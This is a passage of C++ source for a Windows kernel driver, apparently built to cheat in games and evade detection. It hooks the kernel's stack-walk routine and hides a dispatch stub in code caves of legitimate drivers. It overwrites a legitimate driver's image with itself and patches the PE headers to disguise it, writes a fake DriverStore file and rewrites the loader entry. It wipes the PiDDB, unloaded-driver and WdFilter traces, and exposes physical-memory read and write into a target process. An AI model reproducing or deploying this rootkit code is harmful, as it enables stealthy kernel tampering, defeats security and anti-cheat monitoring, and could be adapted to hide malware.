    GetImageSection(ntBase, ".text", &ntTextBase, &ntTextSize);

    auto IsCodePtr = [&](PVOID p) -> BOOLEAN {
        if (!IsKernelPointer(p)) return FALSE;
        if (ntTextBase && (PUCHAR)p >= ntTextBase && (PUCHAR)p < ntTextBase + ntTextSize)
            return TRUE;
        return (PUCHAR)p < fn || (PUCHAR)p > fn + 256;
    };

    for (int i = 0; i < 256; i++) {
        if (!MmIsAddressValid(fn + i + 7)) break;
        PUCHAR p = fn + i;

        if (p[0] == 0xFF && (p[1] == 0x15 || p[1] == 0x25)) {
            INT32 disp = *(INT32*)(p + 2);
            void** slot = (void**)(p + 6 + (LONG_PTR)disp);
            if (IsKernelPointer(slot) && MmIsAddressValid(slot))
                return slot;
        }

        if ((p[0] & 0xF0) == 0x48 && p[1] == 0x8B && (p[2] & 0xC7) == 0x05) {
            INT32 disp = *(INT32*)(p + 3);
            void** slot = (void**)(p + 7 + (LONG_PTR)disp);
            if (IsKernelPointer(slot) && MmIsAddressValid(slot)) {
                PVOID val = *(PVOID*)slot;
                if (IsCodePtr(val)) return slot;
            }
        }
    }

    PVOID target = (PVOID)fn;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntBase;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)ntBase + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE) {
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
            for (USHORT s = 0; s < nt->FileHeader.NumberOfSections; s++, sec++) {
                if (sec->Characteristics & IMAGE_SCN_CNT_CODE) continue;
                if (!(sec->Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
                PUCHAR sbase = (PUCHAR)ntBase + sec->VirtualAddress;
                SIZE_T ssize = sec->Misc.VirtualSize;
                for (SIZE_T j = 0; j + sizeof(PVOID) <= ssize; j += sizeof(PVOID)) {
                    if (!MmIsAddressValid(sbase + j)) continue;
                    if (*(PVOID*)(sbase + j) == target)
                        return (void**)(sbase + j);
                }
            }
        }
    }
    return nullptr;
}

static VOID InstallWalkChainHook(PVOID ntBase) {
    g_pWalkChainPtr = FindRtlWalkFrameChainPtr(ntBase);
    if (!g_pWalkChainPtr) return;

    PVOID replacement = FindZeroRetGadget(ntBase);
    if (!replacement) return;

    g_origWalkChain = InterlockedExchangePointer(g_pWalkChainPtr, replacement);
    g_drvStatus.WalkChainHooked     = 1;
    g_drvStatus.WalkChainUsedGadget = 1;
    g_drvStatus.WalkChainGadgetVA   = (ULONGLONG)replacement;
    g_drvStatus.WalkChainPtrVA      = (ULONGLONG)g_pWalkChainPtr;
}

static VOID RemoveWalkChainHook() {
    if (g_pWalkChainPtr && g_origWalkChain)
        InterlockedExchangePointer(g_pWalkChainPtr, g_origWalkChain);
}

// ============================================================================
// Code cave — prefer host driver, fallback to other modules
// ============================================================================

static PUCHAR FindCodeCave(PVOID base, SIZE_T need) {
    if (!base) return nullptr;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PUCHAR)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    ULONG secAlign = nt->OptionalHeader.SectionAlignment;
    if (!secAlign) secAlign = 0x1000;

    for (int pass = 0; pass < 2; pass++) {
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
            if (!(sec->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
            if (!sec->Misc.VirtualSize) continue;

            SIZE_T paddedSize = ((SIZE_T)sec->Misc.VirtualSize + secAlign - 1) & ~(SIZE_T)(secAlign - 1);
            if (paddedSize <= sec->Misc.VirtualSize) continue;
            SIZE_T tailBytes = paddedSize - sec->Misc.VirtualSize;
            if (tailBytes < need) continue;

            ULONG fileAlign = nt->OptionalHeader.FileAlignment;
            if (!fileAlign) fileAlign = 0x200;
            ULONG rawPadded = (sec->SizeOfRawData + fileAlign - 1) & ~(fileAlign - 1);
            bool trueTail = (rawPadded < (ULONG)paddedSize);
            if (pass == 0 && !trueTail) continue;

            PUCHAR tail = (PUCHAR)base + sec->VirtualAddress + sec->Misc.VirtualSize;
            BOOLEAN ok = TRUE;
            for (SIZE_T j = 0; j < need; j++) {
                if (!MmIsAddressValid(tail + j) ||
                    (tail[j] != 0x00 && tail[j] != 0xCC)) { ok = FALSE; break; }
            }
            if (ok) return tail;
        }
    }
    return nullptr;
}

static BOOLEAN WritePhysPage(PVOID dstVa, PVOID srcVa, SIZE_T size) {
    PMDL mdl = IoAllocateMdl(dstVa, (ULONG)size, FALSE, FALSE, NULL);
    if (!mdl) return FALSE;
    NTSTATUS st = STATUS_UNSUCCESSFUL;
    __try { MmProbeAndLockPages(mdl, KernelMode, IoReadAccess); st = STATUS_SUCCESS; }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    if (!NT_SUCCESS(st)) { IoFreeMdl(mdl); return FALSE; }
    PUCHAR mapped = (PUCHAR)MmMapLockedPagesSpecifyCache(
        mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    if (mapped) {
        if (NT_SUCCESS(MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE))) {
            RtlCopyMemory(mapped, srcVa, size);
            st = STATUS_SUCCESS;
        } else { st = STATUS_UNSUCCESSFUL; }
        MmUnmapLockedPages(mapped, mdl);
    } else { st = STATUS_INSUFFICIENT_RESOURCES; }
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
    return NT_SUCCESS(st);
}

static PUCHAR WriteStubToCave(PUCHAR cave, PVOID target, UCHAR fill) {
    PMDL mdl = IoAllocateMdl(cave, 16, FALSE, FALSE, NULL);
    if (!mdl) return nullptr;
    NTSTATUS st = STATUS_UNSUCCESSFUL;
    __try { MmProbeAndLockPages(mdl, KernelMode, IoReadAccess); st = STATUS_SUCCESS; }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    if (!NT_SUCCESS(st)) { IoFreeMdl(mdl); return nullptr; }
    PUCHAR mapped = (PUCHAR)MmMapLockedPagesSpecifyCache(
        mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    if (mapped) {
        if (NT_SUCCESS(MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE))) {
            if (target) {
                UCHAR stub[14] = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00 };
                *(PVOID*)(stub + 6) = target;
                RtlCopyMemory(mapped, stub, 14);
            } else {
                RtlFillMemory(mapped, 14, fill);
            }
            st = STATUS_SUCCESS;
        } else { st = STATUS_UNSUCCESSFUL; }
        MmUnmapLockedPages(mapped, mdl);
    } else { st = STATUS_INSUFFICIENT_RESOURCES; }
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
    return NT_SUCCESS(st) ? cave : nullptr;
}

static VOID ZeroCave() {
    if (!g_cavePtr) return;
    WriteStubToCave(g_cavePtr, nullptr, 0xCC);
    g_cavePtr = nullptr;
}

// ============================================================================
// Dynamic host driver selection
// ============================================================================

static const WCHAR* const kHostCandidates[] = {
    L"\\Driver\\pcw",
    L"\\Driver\\mup",
    L"\\Driver\\rdyboost",
    L"\\Driver\\volsnap",
    L"\\Driver\\Beep",
};

static PDRIVER_OBJECT FindSuitableHost() {
    for (ULONG i = 0; i < ARRAYSIZE(kHostCandidates); i++) {
        UNICODE_STRING name;
        RtlInitUnicodeString(&name, kHostCandidates[i]);
        PDRIVER_OBJECT drv = nullptr;
        NTSTATUS st = ObReferenceObjectByName(
            &name, OBJ_CASE_INSENSITIVE, nullptr, 0,
            *IoDriverObjectType, KernelMode, nullptr, (PVOID*)&drv);
        if (NT_SUCCESS(st) && drv && drv->DeviceObject) {
            g_drvStatus.HostDriver = i + 1;
            LOG("[+] Host: selected %wZ\n", &name);
            return drv;
        }
        if (drv) ObDereferenceObject(drv);
    }
    return nullptr;
}

// Install cave trampoline — prefer cave within host driver itself
static PDRIVER_DISPATCH InstallCaveTrampoline(PVOID ntBase, PDRIVER_OBJECT pDevOwner) {
    if (!pDevOwner || !pDevOwner->DriverSection) return nullptr;

    // First: try host driver itself — pointer stays in owning module's range
    PLDR_DATA_TABLE_ENTRY hostLdr = (PLDR_DATA_TABLE_ENTRY)pDevOwner->DriverSection;
    if (hostLdr && hostLdr->DllBase) {
        PUCHAR cave = FindCodeCave(hostLdr->DllBase, 16);
        if (cave) {
            PUCHAR result = WriteStubToCave(cave, (PVOID)DispatchIoctl, 0xCC);
            if (result) {
                g_cavePtr = result;
                g_drvStatus.CaveInstalled = 1;
                g_drvStatus.CaveVA = (ULONGLONG)result;
                ULONG cn = hostLdr->BaseDllName.Length / sizeof(WCHAR);
                if (cn >= sizeof(g_drvStatus.CaveModule))
                    cn = sizeof(g_drvStatus.CaveModule) - 1;
                for (ULONG ci = 0; ci < cn; ci++)
                    g_drvStatus.CaveModule[ci] = (CHAR)hostLdr->BaseDllName.Buffer[ci];
                g_drvStatus.CaveModule[cn] = '\0';
                LOG("[+] Cave: installed in host driver %wZ at %p\n", &hostLdr->BaseDllName, result);
                return (PDRIVER_DISPATCH)result;
            }
        }
    }

    // Fallback: search other loaded modules (skip ntoskrnl, self, denylist)
    static const WCHAR* const kDenylist[] = {
        L"CI.dll", L"hal.dll", L"win32k.sys", L"win32kbase.sys",
        L"win32kfull.sys", L"ksecdd.sys", L"ndis.sys", L"tcpip.sys",
        L"fltMgr.sys", L"ACPI.sys", L"pci.sys",
    };

    PLDR_DATA_TABLE_ENTRY ldr0 = hostLdr;
    PLIST_ENTRY head = &ldr0->InLoadOrderLinks;
    ULONG guard = 0;
    for (PLIST_ENTRY cur = head->Flink;
         cur && cur != head && ++guard < 256;
         cur = cur->Flink) {
        PLDR_DATA_TABLE_ENTRY e = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (!e->DllBase) continue;
        if (e->DllBase == ntBase) continue;
        if (e->DllBase == ldr0->DllBase) continue;

        BOOLEAN denied = FALSE;
        for (ULONG d = 0; d < ARRAYSIZE(kDenylist) && !denied; d++) {
            UNICODE_STRING cmp;
            RtlInitUnicodeString(&cmp, kDenylist[d]);
            if (RtlEqualUnicodeString(&e->BaseDllName, &cmp, TRUE)) denied = TRUE;
        }
        if (denied) continue;

        PUCHAR cave = FindCodeCave(e->DllBase, 16);
        if (!cave) continue;
        PUCHAR result = WriteStubToCave(cave, (PVOID)DispatchIoctl, 0xCC);
        if (result) {
            g_cavePtr = result;
            g_drvStatus.CaveInstalled = 1;
            g_drvStatus.CaveVA = (ULONGLONG)result;
            ULONG cn = e->BaseDllName.Length / sizeof(WCHAR);
            if (cn >= sizeof(g_drvStatus.CaveModule))
                cn = sizeof(g_drvStatus.CaveModule) - 1;
            for (ULONG ci = 0; ci < cn; ci++)
                g_drvStatus.CaveModule[ci] = (CHAR)e->BaseDllName.Buffer[ci];
            g_drvStatus.CaveModule[cn] = '\0';
            return (PDRIVER_DISPATCH)result;
        }
    }
    return nullptr;
}

// ============================================================================
// Dynamic stomp target selection
// ============================================================================

struct STOMP_CANDIDATE {
    const WCHAR* Name;
    ULONG        MinSize;
};

static const STOMP_CANDIDATE kStompTargets[] = {
    { L"luafv.sys",    0x20000 },
    { L"Ndu.sys",      0x18000 },
    { L"volsnap.sys",  0x30000 },
    { L"clfs.sys",     0x30000 },
    { L"cng.sys",      0x40000 },
    { L"bowser.sys",   0x18000 },
};

static PLDR_DATA_TABLE_ENTRY SelectStompTarget(PVOID ntBase, ULONG requiredSize) {
    for (ULONG i = 0; i < ARRAYSIZE(kStompTargets); i++) {
        if (kStompTargets[i].MinSize < requiredSize && kStompTargets[i].MinSize < 0x40000)
            continue;
        PLDR_DATA_TABLE_ENTRY ldr = FindModuleLdrEntry(ntBase, kStompTargets[i].Name);
        if (!ldr || !ldr->DllBase) continue;
        if (ldr->SizeOfImage < requiredSize) continue;

        PIMAGE_NT_HEADERS nt = RtlImageNtHeader(ldr->DllBase);
        if (!nt || nt->FileHeader.NumberOfSections < 3) continue;

        g_drvStatus.StompTarget = i + 1;
        LOG("[+] Stomp: selected %wZ (size=0x%X)\n", &ldr->BaseDllName, ldr->SizeOfImage);
        return ldr;
    }
    return nullptr;
}

// ============================================================================
// Disk sync — write stomped image to new file + LDR poison
// ============================================================================

static WCHAR g_stompFilePath[300] = {};

static BOOLEAN WriteStomedImageToNewFile(PVOID stageData, ULONG stageSize,
                                          PLDR_DATA_TABLE_ENTRY targetLdr) {
    LARGE_INTEGER tsc;
    KeQueryTickCount(&tsc);
    ULONG seed = (ULONG)(tsc.QuadPart ^ (ULONG_PTR)IoGetCurrentProcess() ^ kBuildSeed);

    // Extract base name from target for directory naming
    WCHAR baseName[32] = {};
    USHORT baseLen = targetLdr->BaseDllName.Length / sizeof(WCHAR);
    if (baseLen > 20) baseLen = 20;
    for (USHORT i = 0; i < baseLen; i++) {
        WCHAR c = targetLdr->BaseDllName.Buffer[i];
        if (c == L'.') { baseName[i] = L'\0'; break; }
        baseName[i] = c;
    }

    // Build path: \SystemRoot\System32\DriverStore\FileRepository\<name>.inf_amd64_<hash>\<name>.sys
    WCHAR dirPath[280] = {};
    swprintf(dirPath, ARRAYSIZE(dirPath),
        L"\\SystemRoot\\System32\\DriverStore\\FileRepository\\%s.inf_amd64_%08x",
        baseName, seed);

    // Create directory
    UNICODE_STRING dirStr;
    RtlInitUnicodeString(&dirStr, dirPath);
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb = {};
    InitializeObjectAttributes(&oa, &dirStr, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE hDir = NULL;
    ZwCreateFile(&hDir, FILE_LIST_DIRECTORY | SYNCHRONIZE, &oa, &iosb, NULL,
                 FILE_ATTRIBUTE_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE,
                 FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (hDir) ZwClose(hDir);

    // Build full file path
    swprintf(g_stompFilePath, ARRAYSIZE(g_stompFilePath),
        L"%s\\%wZ", dirPath, &targetLdr->BaseDllName);

    UNICODE_STRING filePath;
    RtlInitUnicodeString(&filePath, g_stompFilePath);
    InitializeObjectAttributes(&oa, &filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE hFile = NULL;
    NTSTATUS st = ZwCreateFile(&hFile,
        FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb, NULL,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ,
        FILE_SUPERSEDE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(st)) {
        LOG("[!] DiskSync: create %wZ failed 0x%08X\n", &filePath, st);
        return FALSE;
    }

    LARGE_INTEGER offset = {};
    st = ZwWriteFile(hFile, NULL, NULL, NULL, &iosb, stageData, stageSize, &offset, NULL);
    ZwClose(hFile);
    if (!NT_SUCCESS(st)) {
        LOG("[!] DiskSync: write failed 0x%08X\n", st);
        return FALSE;
    }

    // Poison LDR entry to point to new file
    g_savedFullDllName = targetLdr->FullDllName;
    g_savedBaseDllName = targetLdr->BaseDllName;
    g_poisonedLdr      = targetLdr;
    RtlInitUnicodeString(&targetLdr->FullDllName, g_stompFilePath);
    // BaseDllName stays the same — it still looks like the original driver

    g_drvStatus.DiskSynced = 1;
    LOG("[+] DiskSync: wrote %u bytes to %wZ + LDR poisoned\n", stageSize, &filePath);
    return TRUE;
}

// ============================================================================
// Pool stomp — relocate self into target module
// ============================================================================

static PVOID StompIntoTarget(PVOID ntBase, PVOID selfBase, PLDR_DATA_TABLE_ENTRY targetLdr) {
    PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
    if (!selfNt) return nullptr;
    ULONG imageSize = selfNt->OptionalHeader.SizeOfImage;
    if (!imageSize) return nullptr;

    PVOID targetBase = targetLdr->DllBase;
    if (targetLdr->SizeOfImage < imageSize) return nullptr;

    PIMAGE_NT_HEADERS origNt = RtlImageNtHeader(targetBase);

    // Prepare relocated copy in pool
    PVOID stage = ExAllocatePoolWithTag(NonPagedPool, imageSize, TAG_STAGE);
    if (!stage) return nullptr;
    RtlCopyMemory(stage, selfBase, imageSize);

    LONGLONG delta = (LONGLONG)((ULONG_PTR)targetBase - (ULONG_PTR)selfBase);
    if (delta != 0) {
        PIMAGE_NT_HEADERS stNt = RtlImageNtHeader(stage);
        if (stNt) {
            ULONG relocRva = stNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
            ULONG relocSz  = stNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            if (relocRva && relocSz) {
                PIMAGE_BASE_RELOCATION blk = (PIMAGE_BASE_RELOCATION)((PUCHAR)stage + relocRva);
                PIMAGE_BASE_RELOCATION end = (PIMAGE_BASE_RELOCATION)((PUCHAR)blk + relocSz);
                while (blk < end && blk->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                    ULONG   cnt  = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
                    PUSHORT ents = (PUSHORT)(blk + 1);
                    PUCHAR  base = (PUCHAR)stage + blk->VirtualAddress;
                    for (ULONG i = 0; i < cnt; i++) {
                        if ((ents[i] >> 12) == IMAGE_REL_BASED_DIR64)
                            *(LONGLONG*)(base + (ents[i] & 0x0FFF)) += delta;
                    }
                    blk = (PIMAGE_BASE_RELOCATION)((PUCHAR)blk + blk->SizeOfBlock);
                }
            }
        }
    }

    // Patch PE headers to match original target driver
    if (origNt) {
        PIMAGE_NT_HEADERS stNt = RtlImageNtHeader(stage);
        if (stNt) {
            stNt->FileHeader.TimeDateStamp               = origNt->FileHeader.TimeDateStamp;
            stNt->FileHeader.Characteristics             = origNt->FileHeader.Characteristics;
            stNt->OptionalHeader.ImageBase               = origNt->OptionalHeader.ImageBase;
            stNt->OptionalHeader.SizeOfImage             = origNt->OptionalHeader.SizeOfImage;
            stNt->OptionalHeader.SizeOfCode              = origNt->OptionalHeader.SizeOfCode;
            stNt->OptionalHeader.SizeOfInitializedData   = origNt->OptionalHeader.SizeOfInitializedData;
            stNt->OptionalHeader.SizeOfUninitializedData = origNt->OptionalHeader.SizeOfUninitializedData;
            stNt->OptionalHeader.CheckSum                = origNt->OptionalHeader.CheckSum;
            stNt->OptionalHeader.MajorImageVersion       = origNt->OptionalHeader.MajorImageVersion;
            stNt->OptionalHeader.MinorImageVersion       = origNt->OptionalHeader.MinorImageVersion;
            stNt->OptionalHeader.MajorSubsystemVersion   = origNt->OptionalHeader.MajorSubsystemVersion;
            stNt->OptionalHeader.MinorSubsystemVersion   = origNt->OptionalHeader.MinorSubsystemVersion;
            g_drvStatus.HdrPatched = 1;

            // Overlay section headers from original
            USHORT origSections  = origNt->FileHeader.NumberOfSections;
            PIMAGE_SECTION_HEADER origSec  = IMAGE_FIRST_SECTION(origNt);
            PIMAGE_SECTION_HEADER stageSec = IMAGE_FIRST_SECTION(stNt);
            USHORT stageSections = stNt->FileHeader.NumberOfSections;

            ULONG_PTR secOff = (ULONG_PTR)stageSec - (ULONG_PTR)stage;
            ULONG     hdrSz  = stNt->OptionalHeader.SizeOfHeaders;
            USHORT    maxFit = (secOff < hdrSz)
                ? (USHORT)((hdrSz - secOff) / sizeof(IMAGE_SECTION_HEADER)) : 0;
            USHORT copyCount = (origSections < maxFit) ? origSections : maxFit;

            RtlCopyMemory(stageSec, origSec, copyCount * sizeof(IMAGE_SECTION_HEADER));
            if (stageSections > copyCount)
                RtlZeroMemory(stageSec + copyCount,
                              (stageSections - copyCount) * sizeof(IMAGE_SECTION_HEADER));
            stNt->FileHeader.NumberOfSections  = copyCount;
            stNt->OptionalHeader.SizeOfHeaders = origNt->OptionalHeader.SizeOfHeaders;
            g_drvStatus.SectionHdrPatched = 1;
        }
    }

    // Write stomped image to disk + poison LDR (before stomping memory)
    WriteStomedImageToNewFile(stage, imageSize, targetLdr);

    // Copy updated status into stage
    ULONG_PTR statusOff = (ULONG_PTR)&g_drvStatus - (ULONG_PTR)selfBase;
    if (statusOff + sizeof(BYPASS_STATUS) <= imageSize)
        RtlCopyMemory((PUCHAR)stage + statusOff, &g_drvStatus, sizeof(BYPASS_STATUS));

    // Write to memory page by page via MDL
    BOOLEAN ok = TRUE;
    for (SIZE_T off = 0; off < imageSize; off += PAGE_SIZE) {
        SIZE_T chunk = min((SIZE_T)PAGE_SIZE, imageSize - off);
        if (!WritePhysPage((PUCHAR)targetBase + off, (PUCHAR)stage + off, chunk)) {
            ok = FALSE;
            break;
        }
    }

    ExFreePoolWithTag(stage, TAG_STAGE);
    if (!ok) return nullptr;

    LOG("[+] Stomp: image written to %wZ base=%p size=0x%X\n",
        &targetLdr->BaseDllName, targetBase, imageSize);
    return targetBase;
}

// ============================================================================
// Communication — IOCTL dispatch
// ============================================================================

static VOID ProcessCommPacket(COMM_PACKET* pkt) {
    switch (pkt->Operation) {

    case COMM_OP_INIT_TARGET: {
        // Cache game process and its CR3 — called once by client
        if (g_cachedProcess) {
            ObDereferenceObject(g_cachedProcess);
            g_cachedProcess = nullptr;
        }
        pkt->Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pkt->ProcessId, &g_cachedProcess);
        if (NT_SUCCESS(pkt->Status)) {
            KAPC_STATE apc;
            KeStackAttachProcess(g_cachedProcess, &apc);
            g_cachedDirBase = __readcr3();
            KeUnstackDetachProcess(&apc);
            g_drvStatus.PhysicalRW = 1;
            LOG("[+] InitTarget: PID=%u CR3=0x%llX\n", pkt->ProcessId, g_cachedDirBase);
        }
        break;
    }

    case COMM_OP_READ:
        if (pkt->Size == 0 || pkt->Size > COMM_MAX_SIZE) {
            pkt->Status = STATUS_INVALID_PARAMETER;
            break;
        }
        if (!g_cachedProcess || !g_cachedDirBase) {
            pkt->Status = STATUS_NOT_FOUND;
            break;
        }
        pkt->Status = PhysicalRead(g_cachedDirBase, pkt->AddressSrc,
                                    (PVOID)pkt->AddressDst, pkt->Size);
        break;

    case COMM_OP_WRITE:
        if (pkt->Size == 0 || pkt->Size > COMM_MAX_SIZE) {
            pkt->Status = STATUS_INVALID_PARAMETER;
            break;
        }
        if (!g_cachedProcess || !g_cachedDirBase) {
            pkt->Status = STATUS_NOT_FOUND;
            break;
        }
        pkt->Status = PhysicalWrite(g_cachedDirBase, pkt->AddressDst,
                                     (PVOID)pkt->AddressSrc, pkt->Size);
        break;

    case COMM_OP_GET_BASE:
        if (!g_cachedProcess) {
            pkt->Status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pkt->ProcessId, &g_cachedProcess);
            if (NT_SUCCESS(pkt->Status)) {
                KAPC_STATE apc;
                KeStackAttachProcess(g_cachedProcess, &apc);
                g_cachedDirBase = __readcr3();
                KeUnstackDetachProcess(&apc);
            }
        }
        if (g_cachedProcess) {
            pkt->AddressDst = (ULONGLONG)PsGetProcessSectionBaseAddress(g_cachedProcess);
            pkt->Status = pkt->AddressDst ? STATUS_SUCCESS : STATUS_NOT_FOUND;
        } else {
            pkt->Status = STATUS_NOT_FOUND;
        }
        break;

    case COMM_OP_GET_MODULE:
        pkt->ModuleName[sizeof(pkt->ModuleName) - 1] = '\0';
        if (!g_cachedProcess || !g_cachedDirBase) {
            pkt->Status = STATUS_NOT_FOUND;
            break;
        }
        {
            UINT64 base = FindProcessModule(g_cachedProcess, g_cachedDirBase, pkt->ModuleName);
            if (base) {
                pkt->AddressDst = base;
                pkt->Status = STATUS_SUCCESS;
            } else {
                pkt->Status = STATUS_NOT_FOUND;
            }
        }
        break;

    case COMM_OP_GET_STATUS: {
        // Handshake check
        if (pkt->ProcessId == (ULONG)COMM_HANDSHAKE_MAGIC) {
            pkt->Status = (LONG)COMM_HANDSHAKE_REPLY;
            break;
        }
        static_assert(sizeof(BYPASS_STATUS) <= sizeof(pkt->ModuleName),
                      "BYPASS_STATUS too large");
        BYPASS_STATUS snap = g_drvStatus;
        if (g_pWalkChainPtr && snap.WalkChainHooked) {
            void* cur = *(void* volatile*)g_pWalkChainPtr;
            snap.WalkChainSlotVA = (ULONGLONG)cur;
            snap.WalkChainActive = (cur == (void*)snap.WalkChainGadgetVA) ? 1 : 0;
        }
        if (g_mmUnloadedArr) {
            UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
            BOOLEAN found = FALSE;
            for (ULONG i = 0; i < 50 && !found; i++) {
                if (g_mmUnloadedArr[i].Name.Buffer &&
                    RtlEqualUnicodeString(&g_mmUnloadedArr[i].Name, &vehicleName, TRUE))
                    found = TRUE;
            }
            snap.VehicleUnloadedLive = found ? 0 : 1;
        } else {
            snap.VehicleUnloadedLive = snap.VehicleUnloadedCleared;
        }
        RtlCopyMemory(pkt->ModuleName, &snap, sizeof(BYPASS_STATUS));
        pkt->Status = STATUS_SUCCESS;
        break;
    }

    case COMM_OP_CLEAN_VEHICLE: {
        UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
        if (g_ntBase) ClearUnloadedEntryByName(g_ntBase, &vehicleName);
        pkt->Status = g_ntBase ? STATUS_SUCCESS : STATUS_NOT_FOUND;
        break;
    }

    default:
        pkt->Status = STATUS_INVALID_PARAMETER;
        break;
    }
}

static NTSTATUS DispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    if (DeviceObject != g_pDevice) {
        if (g_origDevCtrl) return g_origDevCtrl(DeviceObject, Irp);
        Irp->IoStatus.Status      = STATUS_NOT_SUPPORTED;
        Irp->IoStatus.Information = 0;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return STATUS_NOT_SUPPORTED;
    }

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_COMM) {
        ULONG inLen  = stack->Parameters.DeviceIoControl.InputBufferLength;
        ULONG outLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
        NTSTATUS  status = STATUS_BUFFER_TOO_SMALL;
        ULONG_PTR info   = 0;

        if (inLen >= sizeof(COMM_PACKET) && outLen >= sizeof(COMM_PACKET)) {
            COMM_PACKET* pkt = (COMM_PACKET*)Irp->AssociatedIrp.SystemBuffer;
            ProcessCommPacket(pkt);
            info   = sizeof(COMM_PACKET);
            status = STATUS_SUCCESS;
        }
        Irp->IoStatus.Status      = status;
        Irp->IoStatus.Information = info;
        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return status;
    }

    if (g_origDevCtrl) return g_origDevCtrl(DeviceObject, Irp);
    Irp->IoStatus.Status      = STATUS_INVALID_DEVICE_REQUEST;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_INVALID_DEVICE_REQUEST;
}

// ============================================================================
// Deferred cleanup — runs from work item after stomp completes
// ============================================================================

typedef struct { WORK_QUEUE_ITEM Item; PVOID NtBase; } CLEANUP_WORK;
static CLEANUP_WORK g_cleanupWork;

static VOID DeferredCleanupCallback(PVOID ctx) {
    CLEANUP_WORK* w = (CLEANUP_WORK*)ctx;
    PVOID ntBase = w->NtBase;
    if (!ntBase) return;

    UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);

    // Clean vehicle traces with retry
    for (ULONG attempt = 0; attempt < 5 && !g_drvStatus.VehicleUnloadedCleared; attempt++) {
        ClearUnloadedEntryByName(ntBase, &vehicleName);
        if (!g_drvStatus.VehicleUnloadedCleared) {
            LARGE_INTEGER wait;
            wait.QuadPart = -20000000LL;
            KeDelayExecutionThread(KernelMode, FALSE, &wait);
        }
    }

    ClearPiDDBEntryByName(ntBase, &vehicleName);
    ClearKernelHashBucketList(ntBase);
    ClearWdFilterDriverList(ntBase);
    InstallWalkChainHook(ntBase);

    g_drvStatus.DeferredCleanupDone = 1;
    LOG("[+] DeferredCleanup: complete\n");
}

// ============================================================================
// DriverEntry — optimized execution order for minimal exposure
// ============================================================================

extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
                                 _In_ PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    // ---- Phase 1: Get ntoskrnl base (fast, no side effects) ----
    PVOID ntBase = DriverObject ? GetNtKernelBase(DriverObject) : nullptr;
    if (!ntBase) ntBase = GetNtKernelBaseAlt();

    g_drvStatus.KDUPath = DriverObject ? 0 : 1;
    g_drvStatus.NtBase  = (ULONGLONG)ntBase;
    g_ntBase            = ntBase;

    // ---- Phase 2: If KDU path — stomp FIRST to minimize exposure ----
    if (!DriverObject) {
        PVOID selfBase = FindSelfBase((PVOID)(ULONG_PTR)DriverEntry);
        PVOID newBase  = nullptr;

        if (selfBase && ntBase) {
            PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
            ULONG requiredSize = selfNt ? selfNt->OptionalHeader.SizeOfImage : 0;

            PLDR_DATA_TABLE_ENTRY stompLdr = SelectStompTarget(ntBase, requiredSize);
            if (stompLdr) {
                newBase = StompIntoTarget(ntBase, selfBase, stompLdr);
                if (newBase) {
                    g_drvStatus.PoolStomped = 1;
                    g_mmUnloadedArr = FindMmUnloadedArray(ntBase);
                }
            }
        }

